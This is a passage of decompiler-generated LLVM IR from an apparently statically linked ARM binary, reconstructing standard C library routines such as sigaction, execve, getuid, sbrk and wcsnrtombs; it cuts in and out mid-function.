  store i32 ptrtoint (i32* @global_var_32b4c.985 to i32), i32* @r2, align 4
  store i32 %v0_16138, i32* @global_var_32b4c.985, align 4
  br i1 %v3_16130, label %dec_label_pc_16140, label %dec_label_pc_16168

dec_label_pc_16140:                               ; preds = %bb46
  %v0_16140 = call i32 @getuid()
  store i32 %v0_16140, i32* @r0, align 4
  store i32 %v0_16140, i32* @r4, align 4
  %v0_16148 = call i32 @geteuid()
  %v0_1614c = load i32, i32* @r4, align 4
  %v9_1614c = icmp eq i32 %v0_1614c, %v0_16148
  br i1 %v9_1614c, label %dec_label_pc_16154, label %dec_label_pc_16190

dec_label_pc_16154:                               ; preds = %dec_label_pc_16140
  %v1_16154 = call i32 @getgid(i32 %v0_16148)
  store i32 %v1_16154, i32* @r0, align 4
  store i32 %v1_16154, i32* @r4, align 4
  %v0_1615c = call i32 @getegid()
  %v0_16160 = load i32, i32* @r4, align 4
  %v9_16160 = icmp eq i32 %v0_16160, %v0_1615c
  br i1 %v9_16160, label %dec_label_pc_16168, label %dec_label_pc_16190

dec_label_pc_16168:                               ; preds = %dec_label_pc_16154, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_16130, label %dec_label_pc_161fc, label %dec_label_pc_16174

dec_label_pc_16174:                               ; preds = %dec_label_pc_16168
  %v9_16178 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_16178, label %dec_label_pc_16180, label %dec_label_pc_16190

dec_label_pc_16180:                               ; preds = %dec_label_pc_16174
  br label %dec_label_pc_16190

dec_label_pc_16190:                               ; preds = %dec_label_pc_16180, %dec_label_pc_16174, %dec_label_pc_16154, %dec_label_pc_16140
  %v2_16198 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_161a4 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_161b0 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_161fc

dec_label_pc_161fc:                               ; preds = %dec_label_pc_16190, %dec_label_pc_16168
  %v0_161c0 = load i32, i32* @r6, align 4
  %v1_161c0 = inttoptr i32 %v0_161c0 to i32*
  %v2_161c0 = load i32, i32* %v1_161c0, align 4
  store i32 %v2_161c0, i32* @global_var_2c8c0, align 4
  store i32 %arg5, i32* @global_var_32b50.1231, align 4
  %v2_161fc = icmp eq i32 %arg4, 0
  br i1 %v2_161fc, label %dec_label_pc_16238, label %bb47

bb47:                                             ; preds = %dec_label_pc_161fc
  br label %dec_label_pc_16238

dec_label_pc_16238:                               ; preds = %dec_label_pc_161fc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_16248 = call i32 @__errno_location()
  %v2_16250 = inttoptr i32 %v1_16248 to i32*
  store i32 0, i32* %v2_16250, align 4
  %v1_16264 = call i32 @__GI___h_errno_location()
  %v2_1626c = inttoptr i32 %v1_16264 to i32*
  store i32 0, i32* %v2_1626c, align 4
  %v0_1627c = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_16288 = call i32 @__GI_exit(i32 %v0_1627c)
  ret i32 %v1_16288

; uselistorder directives
  uselistorder i32 %v2_16108, { 1, 0 }
  uselistorder i32 %v1_16104, { 1, 0 }
  uselistorder i1 %v2_160f0, { 1, 0 }
  uselistorder i32 %v4_160d8, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_32b4c.985, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 4096, { 2, 3, 15, 6, 16, 4, 1, 12, 5, 7, 8, 13, 14, 9, 17, 10, 18, 0, 11 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32 13, { 1, 3, 0, 2 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16238, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_16108, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_160f0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_162c0 = load i32, i32* @r4, align 4
  %v6_162c0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_162c4 = icmp eq i32* %arg2, null
  %v2_162c8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_162c4, label %dec_label_pc_16334, label %dec_label_pc_162d8

dec_label_pc_162d8:                               ; preds = %entry
  %v2_162dc = load i32, i32* %arg2, align 4
  %v4_162dc = add i32 %tmp, 4
  store i32 %v4_162dc, i32* @r1, align 4
  %v2_162e0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_162e0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_162dc, i32* %stack_var_-156, align 4
  %v0_162ec = call i32 @memcpy()
  store i32 %v0_162ec, i32* %r0.global-to-local, align 4
  %v0_162f0 = load i32, i32* @r4, align 4
  %v1_162f0 = add i32 %v0_162f0, 132
  %v2_162f0 = inttoptr i32 %v1_162f0 to i32*
  %v3_162f0 = load i32, i32* %v2_162f0, align 4
  %v1_162f4 = and i32 %v3_162f0, 67108864
  %v2_162f4 = icmp eq i32 %v1_162f4, 0
  br i1 %v2_162f4, label %dec_label_pc_16308, label %bb

bb:                                               ; preds = %dec_label_pc_162d8
  br label %dec_label_pc_16324

dec_label_pc_16308:                               ; preds = %dec_label_pc_162d8
  %v1_16310 = and i32 %v3_162f0, 4
  %v2_16310 = icmp eq i32 %v1_16310, 0
  br i1 %v2_16310, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_16308
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16308, %bb20
  br label %dec_label_pc_16324

dec_label_pc_16324:                               ; preds = %bb, %bb21
  %v2_16324 = icmp eq i32 %v0_162f0, 0
  %v3_16328 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_16328 = select i1 %v2_16324, i32 0, i32 %v3_16328
  %v0_16334.pre = load i32, i32* @r5, align 4
  %v0_16344.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16334

dec_label_pc_16334:                               ; preds = %dec_label_pc_16324, %entry
  %v0_16344 = phi i32 [ %arg1, %entry ], [ %v0_16344.pre, %dec_label_pc_16324 ]
  %v0_16334 = phi i32 [ %arg3, %entry ], [ %v0_16334.pre, %dec_label_pc_16324 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_16328, %dec_label_pc_16324 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_16334 = icmp eq i32 %v0_16334, 0
  %.v2_162c8 = select i1 %v2_16334, i32 0, i32 %v2_162c8
  store i32 %.v2_162c8, i32* @r2, align 4
  store i32 %v0_16344, i32* %r0.global-to-local, align 4
  %v1_16348 = call i32 @__syscall_rt_sigaction(i32 %v0_16344)
  store i32 %v1_16348, i32* %r0.global-to-local, align 4
  %v0_1634c = load i32, i32* @r5, align 4
  %v2_1634c = icmp eq i32 %v0_1634c, 0
  br i1 %v2_1634c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_16334
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_16334, %bb25
  %v0_1635c.pr = phi i32 [ 0, %dec_label_pc_16334 ], [ 1, %bb25 ]
  %v1_16354 = icmp slt i32 %v1_16348, 0
  br i1 %v1_16354, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_16390

thread-pre-split:                                 ; preds = %bb26
  %v2_1635c = icmp eq i32 %v0_1635c.pr, 0
  store i32 %v1_16348, i32* @r4, align 4
  br i1 %v2_1635c, label %dec_label_pc_16390, label %dec_label_pc_16368

dec_label_pc_16368:                               ; preds = %thread-pre-split
  %v2_16368 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_1634c, i32* %r0.global-to-local, align 4
  %v2_16370 = inttoptr i32 %v0_1634c to i32*
  store i32 %v2_16368, i32* %v2_16370, align 4
  %v3_16370 = load i32, i32* %r0.global-to-local, align 4
  %v4_16370 = add i32 %v3_16370, 4
  store i32 %v4_16370, i32* @r0, align 4
  %v2_16374 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_16374, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_1637c = call i32 @memcpy()
  store i32 %v0_1637c, i32* %r0.global-to-local, align 4
  %v1_16384 = load i32, i32* @r5, align 4
  %v2_16384 = add i32 %v1_16384, 136
  %v3_16384 = inttoptr i32 %v2_16384 to i32*
  %v1_1638c = load i32, i32* @r5, align 4
  %v2_1638c = add i32 %v1_1638c, 132
  %v3_1638c = inttoptr i32 %v2_1638c to i32*
  %v0_16390.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16390

dec_label_pc_16390:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_16368
  %v0_16390 = phi i32 [ %v1_16348, %thread-pre-split ], [ %v0_16390.pre, %dec_label_pc_16368 ], [ %v1_16348, %thread-pre-split.thread ]
  store i32 %v0_16390, i32* %r0.global-to-local, align 4
  store i32 %v3_162c0, i32* @r4, align 4
  store i32 %v6_162c0, i32* @r5, align 4
  ret i32 %v0_16390

; uselistorder directives
  uselistorder i32 %v0_16390, { 1, 0 }
  uselistorder i32 %v0_1634c, { 1, 0, 2 }
  uselistorder i32 %v0_16344, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 7, 6, 1, 0 }
  uselistorder label %dec_label_pc_16390, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_16324, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_163a4 = load i32, i32* @r4, align 4
  store i32 %v3_163a4, i32* %stack_var_-8, align 4
  %v0_163a8 = load i32, i32* @r0, align 4
  %v0_163ac = call i32 @__errno_location()
  %v1_163b0 = sub i32 0, %v0_163a8
  %v2_163b4 = inttoptr i32 %v0_163ac to i32*
  store i32 %v1_163b0, i32* %v2_163b4, align 4
  %v2_163bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163bc, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_163c0 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_163c0
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_163c4 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_163c4
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163c8 = load i32, i32* @r4, align 4
  store i32 %v3_163c8, i32* %stack_var_-8, align 4
  %v1_163cc = load i32, i32* @r1, align 4
  %v2_163cc = inttoptr i32 %v1_163cc to %sigaction*
  %v3_163cc = load i32, i32* @r2, align 4
  %v4_163cc = inttoptr i32 %v3_163cc to %sigaction*
  %v5_163cc = call i32 @sigaction(i32 %arg1, %sigaction* %v2_163cc, %sigaction* %v4_163cc)
  store i32 %v5_163cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_163cc, -4095
  br i1 %tmp, label %dec_label_pc_163ec, label %dec_label_pc_163dc

dec_label_pc_163dc:                               ; preds = %entry
  %v0_163dc = call i32 @__errno_location()
  %v0_163e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_163e0 = sub i32 0, %v0_163e0
  %v2_163e4 = inttoptr i32 %v0_163dc to i32*
  store i32 %v1_163e0, i32* %v2_163e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163ec

dec_label_pc_163ec:                               ; preds = %entry, %dec_label_pc_163dc
  %v0_163ec = phi i32 [ %v5_163cc, %entry ], [ -1, %dec_label_pc_163dc ]
  %v2_163f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163f0, i32* %r4.global-to-local, align 4
  ret i32 %v0_163ec

; uselistorder directives
  uselistorder i32 %v5_163cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163ec, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163f4 = load i32, i32* @r4, align 4
  store i32 %v3_163f4, i32* %stack_var_-8, align 4
  %v0_163f8 = load i32, i32* @r0, align 4
  %v1_163f8 = inttoptr i32 %v0_163f8 to i8*
  %v2_163f8 = load i32, i32* @r1, align 4
  %v3_163f8 = inttoptr i32 %v2_163f8 to i8*
  %v4_163f8 = insertvalue [1 x i8*] undef, i8* %v3_163f8, 0
  %v5_163f8 = load i32, i32* @r2, align 4
  %v6_163f8 = inttoptr i32 %v5_163f8 to i8*
  %v7_163f8 = insertvalue [1 x i8*] undef, i8* %v6_163f8, 0
  %v8_163f8 = call i32 @execve(i8* %v1_163f8, [1 x i8*] %v4_163f8, [1 x i8*] %v7_163f8)
  store i32 %v8_163f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_163f8, -4095
  br i1 %tmp, label %dec_label_pc_16418, label %dec_label_pc_16408

dec_label_pc_16408:                               ; preds = %entry
  %v0_16408 = call i32 @__errno_location()
  %v0_1640c = load i32, i32* %r4.global-to-local, align 4
  %v1_1640c = sub i32 0, %v0_1640c
  %v2_16410 = inttoptr i32 %v0_16408 to i32*
  store i32 %v1_1640c, i32* %v2_16410, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16418

dec_label_pc_16418:                               ; preds = %entry, %dec_label_pc_16408
  %v0_16418 = phi i32 [ %v8_163f8, %entry ], [ -1, %dec_label_pc_16408 ]
  %v2_1641c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1641c, i32* @r4, align 4
  ret i32 %v0_16418

; uselistorder directives
  uselistorder i32 %v8_163f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16418, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16420 = load i32, i32* @r4, align 4
  store i32 %v3_16420, i32* %stack_var_-8, align 4
  %v0_16428 = load i32, i32* @r0, align 4
  store i32 %v0_16428, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16428, -4095
  br i1 %tmp, label %dec_label_pc_16444, label %dec_label_pc_16434

dec_label_pc_16434:                               ; preds = %entry
  %v0_16434 = call i32 @__errno_location()
  %v0_16438 = load i32, i32* %r4.global-to-local, align 4
  %v1_16438 = sub i32 0, %v0_16438
  %v2_1643c = inttoptr i32 %v0_16434 to i32*
  store i32 %v1_16438, i32* %v2_1643c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_16448.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16444

dec_label_pc_16444:                               ; preds = %entry, %dec_label_pc_16434
  %v2_16448 = phi i32 [ %v3_16420, %entry ], [ %v2_16448.pre, %dec_label_pc_16434 ]
  %v0_16444 = phi i32 [ %v0_16428, %entry ], [ -1, %dec_label_pc_16434 ]
  store i32 %v2_16448, i32* @r4, align 4
  ret i32 %v0_16444

; uselistorder directives
  uselistorder i32 %v0_16428, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16444, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1644c = load i32, i32* @r4, align 4
  store i32 %v3_1644c, i32* %stack_var_-8, align 4
  %v0_16454 = load i32, i32* @r0, align 4
  store i32 %v0_16454, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16454, -4095
  br i1 %tmp, label %dec_label_pc_16470, label %dec_label_pc_16460

dec_label_pc_16460:                               ; preds = %entry
  %v0_16460 = call i32 @__errno_location()
  %v0_16464 = load i32, i32* %r4.global-to-local, align 4
  %v1_16464 = sub i32 0, %v0_16464
  %v2_16468 = inttoptr i32 %v0_16460 to i32*
  store i32 %v1_16464, i32* %v2_16468, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_16474.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16470

dec_label_pc_16470:                               ; preds = %entry, %dec_label_pc_16460
  %v2_16474 = phi i32 [ %v3_1644c, %entry ], [ %v2_16474.pre, %dec_label_pc_16460 ]
  %v0_16470 = phi i32 [ %v0_16454, %entry ], [ -1, %dec_label_pc_16460 ]
  store i32 %v2_16474, i32* @r4, align 4
  ret i32 %v0_16470

; uselistorder directives
  uselistorder i32 %v0_16454, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16470, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16478 = load i32, i32* @r4, align 4
  store i32 %v3_16478, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1649c, label %dec_label_pc_1648c

dec_label_pc_1648c:                               ; preds = %entry
  %v0_1648c = call i32 @__errno_location()
  %v0_16490 = load i32, i32* %r4.global-to-local, align 4
  %v1_16490 = sub i32 0, %v0_16490
  %v2_16494 = inttoptr i32 %v0_1648c to i32*
  store i32 %v1_16490, i32* %v2_16494, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_164a0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1649c

dec_label_pc_1649c:                               ; preds = %entry, %dec_label_pc_1648c
  %v2_164a0 = phi i32 [ %v3_16478, %entry ], [ %v2_164a0.pre, %dec_label_pc_1648c ]
  %v0_1649c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1648c ]
  store i32 %v2_164a0, i32* %r4.global-to-local, align 4
  ret i32 %v0_1649c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1649c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164a4 = load i32, i32* @r4, align 4
  store i32 %v3_164a4, i32* %stack_var_-8, align 4
  %v0_164ac = load i32, i32* @r0, align 4
  store i32 %v0_164ac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164ac, -4095
  br i1 %tmp, label %dec_label_pc_164c8, label %dec_label_pc_164b8

dec_label_pc_164b8:                               ; preds = %entry
  %v0_164b8 = call i32 @__errno_location()
  %v0_164bc = load i32, i32* %r4.global-to-local, align 4
  %v1_164bc = sub i32 0, %v0_164bc
  %v2_164c0 = inttoptr i32 %v0_164b8 to i32*
  store i32 %v1_164bc, i32* %v2_164c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_164cc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %entry, %dec_label_pc_164b8
  %v2_164cc = phi i32 [ %v3_164a4, %entry ], [ %v2_164cc.pre, %dec_label_pc_164b8 ]
  %v0_164c8 = phi i32 [ %v0_164ac, %entry ], [ -1, %dec_label_pc_164b8 ]
  store i32 %v2_164cc, i32* %r4.global-to-local, align 4
  ret i32 %v0_164c8

; uselistorder directives
  uselistorder i32 %v0_164ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164c8, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_164d0 = load i32, i32* @r4, align 4
  store i32 %v3_164d0, i32* %stack_var_-8, align 4
  %v6_164d4 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_164d4, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_164d4, -4095
  br i1 %tmp6, label %dec_label_pc_164f4, label %dec_label_pc_164e4

dec_label_pc_164e4:                               ; preds = %entry
  %v0_164e4 = call i32 @__errno_location()
  %v0_164e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_164e8 = sub i32 0, %v0_164e8
  %v2_164ec = inttoptr i32 %v0_164e4 to i32*
  store i32 %v1_164e8, i32* %v2_164ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164f4

dec_label_pc_164f4:                               ; preds = %entry, %dec_label_pc_164e4
  %v0_164f4 = phi i32 [ %v6_164d4, %entry ], [ -1, %dec_label_pc_164e4 ]
  %v2_164f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_164f8, i32* %r4.global-to-local, align 4
  ret i32 %v0_164f4

; uselistorder directives
  uselistorder i32 %v6_164d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164f4, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_164fc = load i32, i32* @r4, align 4
  store i32 %v3_164fc, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_32b80.1265 to i32), i32* %r4.global-to-local, align 4
  %v2_16504 = load i32, i32* @global_var_32b80.1265, align 4
  %v2_16508 = icmp eq i32 %v2_16504, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_16508, label %dec_label_pc_16518, label %dec_label_pc_16524

dec_label_pc_16518:                               ; preds = %entry
  %v2_16518 = call i32 @__GI_brk(i32* null)
  %v1_1651c = icmp slt i32 %v2_16518, 0
  br i1 %v1_1651c, label %dec_label_pc_16544, label %dec_label_pc_16524thread-pre-split

dec_label_pc_16524thread-pre-split:               ; preds = %dec_label_pc_16518
  %v0_16528.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_16524.pre = load i32, i32* @global_var_32b80.1265, align 4
  br label %dec_label_pc_16524

dec_label_pc_16524:                               ; preds = %dec_label_pc_16524thread-pre-split, %entry
  %v2_16524 = phi i32 [ %v2_16524.pre, %dec_label_pc_16524thread-pre-split ], [ %v2_16504, %entry ]
  %v1_16530 = phi i32 [ %v0_16528.pr, %dec_label_pc_16524thread-pre-split ], [ %arg1, %entry ]
  %v2_16528 = icmp eq i32 %v1_16530, 0
  store i32 %v2_16524, i32* %r4.global-to-local, align 4
  br i1 %v2_16528, label %dec_label_pc_16548, label %dec_label_pc_16538

dec_label_pc_16538:                               ; preds = %dec_label_pc_16524
  %v2_16530 = add i32 %v1_16530, %v2_16524
  %v1_16538 = inttoptr i32 %v2_16530 to i32*
  %v2_16538 = call i32 @__GI_brk(i32* %v1_16538)
  %v1_1653c = icmp slt i32 %v2_16538, 0
  br i1 %v1_1653c, label %dec_label_pc_16544, label %dec_label_pc_16538.dec_label_pc_16548_crit_edge

dec_label_pc_16538.dec_label_pc_16548_crit_edge:  ; preds = %dec_label_pc_16538
  %v0_16548.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_16544:                               ; preds = %dec_label_pc_16538, %dec_label_pc_16518
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_16548:                               ; preds = %dec_label_pc_16538.dec_label_pc_16548_crit_edge, %dec_label_pc_16524, %dec_label_pc_16544
  %v0_16548 = phi i32 [ %v0_16548.pre, %dec_label_pc_16538.dec_label_pc_16548_crit_edge ], [ %v2_16524, %dec_label_pc_16524 ], [ -1, %dec_label_pc_16544 ]
  %v2_1654c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1654c, i32* @r4, align 4
  ret i32 %v0_16548

; uselistorder directives
  uselistorder i32 %v2_16524, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 24, 25, 22, 23, 21, 20, 19, 26, 27, 28, 2 }
  uselistorder label %dec_label_pc_16548, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16554 = load i32, i32* @r4, align 4
  store i32 %v3_16554, i32* %stack_var_-8, align 4
  %v0_16558 = call i32 @wait4()
  store i32 %v0_16558, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16558, -4095
  br i1 %tmp, label %dec_label_pc_16578, label %dec_label_pc_16568

dec_label_pc_16568:                               ; preds = %entry
  %v0_16568 = call i32 @__errno_location()
  %v0_1656c = load i32, i32* %r4.global-to-local, align 4
  %v1_1656c = sub i32 0, %v0_1656c
  %v2_16570 = inttoptr i32 %v0_16568 to i32*
  store i32 %v1_1656c, i32* %v2_16570, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16578

dec_label_pc_16578:                               ; preds = %entry, %dec_label_pc_16568
  %v0_16578 = phi i32 [ %v0_16558, %entry ], [ -1, %dec_label_pc_16568 ]
  %v2_1657c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1657c, i32* @r4, align 4
  ret i32 %v0_16578

; uselistorder directives
  uselistorder i32 %v0_16558, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16578, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_32b60.1267 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_16590 = icmp eq i32 %arg1, 0
  br i1 %v2_16590, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_16598 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_165c0 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_165b4 = phi i32 [ %arg1, %.thread ], [ %v3_16598, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_165ac = ptrtoint i32* %stack_var_-16 to i32
  %v2_165b8 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_165b8, i32* %stack_var_-16, align 4
  store i32 %v0_165c0, i32* %stack_var_-12, align 4
  %v5_165c8 = inttoptr i32 %v0_165b4 to i8*
  %v6_165c8 = call i32 @__GI_wcsnrtombs(i8* %v5_165c8, i32 %v2_165ac, i32 1, i32 16, i32 %arg3)
  %v2_165cc = icmp eq i32 %v6_165c8, 0
  br i1 %v2_165cc, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_165d8 = phi i32 [ %v6_165c8, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_165d8

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_165e8 = load i32, i32* @r2, align 4
  store i32 %v0_165e8, i32* @r3, align 4
  %v0_165f0 = load i32, i32* @r0, align 4
  %v1_165f0 = load i32, i32* @r1, align 4
  %v5_165f0 = inttoptr i32 %v0_165f0 to i8*
  %v6_165f0 = call i32 @__GI_wcsnrtombs(i8* %v5_165f0, i32 %v1_165f0, i32 -1, i32 %v0_165e8, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_165f0
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_165fc = load i32, i32* @r4, align 4
  store i32 %v3_165fc, i32* %stack_var_-8, align 4
  %v10_16600 = icmp eq i32 %tmp, %arg2
  br i1 %v10_16600, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_166081 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1661c

bb:                                               ; preds = %entry
